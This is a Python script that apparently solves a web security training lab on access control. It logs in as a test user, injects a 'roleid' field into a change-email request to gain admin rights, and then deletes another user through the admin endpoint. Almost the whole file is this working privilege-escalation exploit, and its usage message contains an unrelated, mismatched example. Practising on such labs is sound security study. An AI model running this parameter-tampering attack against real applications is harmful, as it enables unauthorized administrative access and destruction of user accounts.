# Lab #4 User role can be modified in user profile
# import re
import sys

# from typing import Optional, cast

import requests
import urllib3

# from bs4 import BeautifulSoup
# from bs4.element import Tag
from colorama import Fore

# import urllib.parse
# from requests.exceptions import RequestException

urllib3.disable_warnings()

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def delete_user():
    login_url = url + "login"
    data_login = {"username": "wiener", "password": "peter"}
    r = s.post(login_url, data=data_login, verify=False, proxies=proxies, timeout=5)
    r.raise_for_status()
    res = r.text
    if "Log out" in res:
        print(f"{Fore.GREEN}[+] Logged in as wiener user{Fore.RESET}")

        # Change the role id of the user
        change_email_url = url + "my-account/change-email"
        data_role_change = {"email": "a@a.com", "roleid": 2}
        r = s.post(
            change_email_url,
            json=data_role_change,
            verify=False,
            proxies=proxies,
            timeout=5,
        )
        r.raise_for_status()
        res = r.text
        if "Admin" in res:
            print(f"{Fore.GREEN}[+] Email changed to a@a.com{Fore.RESET}")

            # Delete the Carlos user
            delete_carlos_url = url + "admin/delete?username=carlos"
            r = s.get(delete_carlos_url, verify=False, proxies=proxies, timeout=5)
            r.raise_for_status()
            if r.status_code == 200:
                print(f"{Fore.GREEN}[+] Carlos deleted{Fore.RESET}")
            else:
                print(f"{Fore.RED}[-] Carlos not deleted{Fore.RESET}")
                sys.exit(-1)
        else:
            print(f"{Fore.RED}[-] Email not changed{Fore.RESET}")
            sys.exit(-1)
    else:
        print(f"{Fore.RED}[-] Couldn't log in{Fore.RESET}")
        sys.exit(-1)


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print(f"{Fore.RED}[-] Usage: {sys.argv[0]} <url>{Fore.RESET}")
        print(
            f'[-] Example: {sys.argv[0]} USER_NAME = "administrator" TABLE_NAME = "users" COLUMN_NAME = "username""'
        )
        sys.exit(-1)

    print("[*] Exploiting...")
    s = requests.Session()
    delete_user()
